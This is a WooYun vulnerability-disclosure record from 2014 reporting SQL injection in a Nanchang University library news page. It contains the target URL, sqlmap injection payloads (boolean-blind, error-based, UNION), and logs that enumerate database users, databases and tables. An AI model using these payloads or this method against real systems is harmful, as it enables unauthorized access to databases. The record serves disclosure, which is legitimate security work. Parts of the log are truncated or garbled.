{"id": 55118, "wybug_id": "wooyun-2014-062139", "wybug_title": "南昌大学图书馆sql注入", "wybug_corp": "南昌大学", "wybug_author": "troublesaver", "wybug_date": "2014-05-27 18:07", "wybug_open_date": "2014-07-11 18:07", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向公众公开  简要描述： 我是来拿邀请码滴 详细说明：  公告页面存在sql注入http://lib.ncu.edu.cn/readerservice/lib_news.asp?n1=10sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: n1    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: n1=1' AND 3771=3771 AND 'VLYf'='VLYf    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: n1=1' AND 9969=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(115)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9969=9969) THEN CHAR(48) END))+CHAR(113)+CHAR(121)+CHAR(98)+CHAR(113)+CHAR(113))) AND 'RCIT'='RCIT    Type: UNION query    Title: Generic UNION query (NULL) - 5 columns    Payload: n1=1' UNION ALL SELECT CHAR(113)+CHAR(111)+CHAR(115)+CHAR(112)+CHAR(113)+CHAR(86)+CHAR(118)+CHAR(116)+CHAR(97)+CHAR(117)+CH6)+CHAR(114)+CHAR(86)+CHAR(101)+CHAR(113)+CHAR(121)+CHAR(98)+CHAR(113)+CHAR(113),NULL,NULL,NULL,NULL-----   漏洞证明：  atabase management system users [5]:*] BUILTIN\\\\Administrators*] cxuser*] libcomm*] libuser*] sa13:55:06] [INFO] fetching database names13:55:06] [INFO] the SQL query used returns 9 entries13:55:06] [INFO] starting 7 threads13:55:06] [INFO] resumed: \"cxreport\"13:55:06] [INFO] resumed: \"Giftbook\"13:55:06] [INFO] resumed: \"LibDB_08\"13:55:06] [INFO] resumed: \"libHome\"13:55:06] [INFO] resumed: \"model\"13:55:07] [INFO] resumed: \"master\"13:55:07] [INFO] resumed: \"msdb\"13:55:07] [INFO] resumed: \"nweb\"13:55:07] [INFO] resumed: \"tempdb\"vailable databases [9]:*] cxreport*] Giftbook*] LibDB_08*] libHome*] master*] model*] msdb*] nweb*] tempdb13:55:07] [WARNING] missing table parameter, sqlmap will retrieve th13:55:07] [INFO] fetching tables for databases: Giftbook, LibDB_08,13:55:07] [INFO] the SQL query used returns 2 entries13:55:07] [INFO] starting 2 threads13:55:07] [INFO] resumed: \"dbo.syssegments\"13:55:07] [INFO] resumed: \"dbo.sysconstraints\"13:55:07] [WARNING] the SQL query provided does not return any outpu13:55:07] [WARNING] the SQL query provided does not return any outpu13:55:07] [WARNING] in case of continuous data retrieval problems yo13:55:08] [WARNING] the SQL query provided does not return any outpu13:55:08] [WARNING] the SQL query provided does not return any outpu13:55:09] [WARNING] the SQL query provided does not return any outpu13:55:09] [WARNING] the SQL query provided does not return any outpu13:55:09] [WARNING] the SQL query provided does not return any outpu13:55:12] [WARNING] the SQL query provided does not return any outpu13:55:13] [WARNING] the SQL query provided does not return any outpu13:55:13] [WARNING] the SQL query provided does not return any outpu13:55:13] [WARNING] the SQL query provided does not return any outpu13:55:13] [WARNING] the SQL query provided does not return any outpu13:55:13] [INFO] the SQL query used returns 82 entries13:55:13] [INFO] starting 7 threads13:55:13] [INFO] the SQL query used returns 10 entries13:55:13] [INFO] starting 7 threads13:55:13] [INFO] resumed: \"dbo.dtproperties\"13:55:13] [INFO] resumed: \"dbo.gzzd\"13:55:13] [INFO] resumed: \"dbo.libnews\"13:55:13] [INFO] resumed: \"dbo.superuser\"13:55:13] [INFO] resumed: \"dbo.sysconstraints\"13:55:13] [INFO] resumed: \"dbo.xxdt\"13:55:13] [INFO] resumed: \"dbo.syssegments\"13:55:13] [INFO] resumed: \"libuser.pangolin_test_table\"13:55:13] [INFO] resumed: \"libuser.SQL_Dir\"13:55:13] [INFO] resumed: \"libuser.SQL_Path\"13:55:14] [WARNING] the SQL query provided does not return any outpu13:55:14] [WARNING] the SQL query provided does not return any outpu13:55:14] [WARNING] the SQL query provided does not return any outpu13:55:14] [WARNING] the SQL query provided does not return any outpu13:55:14] [INFO] the SQL query used returns 36 entries13:55:14] [INFO] starting 7 threads13:55:15] [WARNING] the SQL query provided does not return any outpu13:55:15] [WARNING] the SQL query provided does not return any outpu13:55:15] [WARNING] the SQL query provided does not return any outpu13:55:16] [WARNING] the SQL query provided does not return any outpuatabase: nweb--------------------------------------+---------+ Table                                | Entries |--------------------------------------+---------+ dbo.xxdt                             | 123     | dbo.gzzd                             | 50      | dbo.libnews                          | 9       | dbo.sysconstraints                   | 9       | dbo.syssegments                      | 3       | dbo.superuser                        | 1       | libuser.SQL_Dir                      | 1       |--------------------------------------+---------+atabase: tempdb--------------------------------------+---------+ Table                                | Entries |--------------------------------------+---------+ dbo.syssegments                      | 3       |--------------------------------------+---------+atabase: master--------------------------------------+---------+ Table                                | Entries |--------------------------------------+---------+ INFORMATION_SCHEMA.PARAMETERS        | 2294    | dbo.spt_values                       | 730     | INFORMATION_SCHEMA.ROUTINES          | 652     | INFORMATION_SCHEMA.COLUMN_PRIVILEGES | 379     | INFORMATION_SCHEMA.COLUMNS           | 379     | INFORMATION_SCHEMA.VIEW_COLUMN_USAGE | 295     | INFORMATION_SCHEMA.VIEW_TABLE_USAGE  | 62      | INFORMATION_SCHEMA.TABLES            | 34      | INFORMATION_SCHEMA.TABLE_PRIVILEGES  | 33      | dbo.spt_server_info                  | 29      | dbo.spt_provider_types               | 25      | INFORMATION_SCHEMA.VIEWS             | 25      | INFORMATION_SCHEMA.ROUTINE_COLUMNS   | 17      | dbo.spt_datatype_info_ext            | 10      | dbo.spt_datatype_info_ext            | 10      | INFORMATION_SCHEMA.SCHEMATA          | 9       | dbo.syssegments                      | 3       | dbo.spt_monitor                      | 1       | dbo.sysconstraints                   | 1       |--------------------------------------+---------+atabase: msdb--------------------------------------+---------+ Table                                | Entries |--------------------------------------+---------+ dbo.sysconstraints                   | 99      | dbo.backupfile                       | 20      | dbo.syscategories                    | 19      | dbo.backupmediafamily                | 14      | dbo.backupmediaset                   | 14      | dbo.backupset                        | 14      | dbo.syssegments                      | 3       |--------------------------------------+---------+   修复方案：     版权声明：转载请注明来源 troublesaver@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-05-28 16:35 厂商回复： 已经通知用户处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-15 21:04 |    \t\ttroublesaver \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | O(∩_∩)O)\t\t \n  111    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}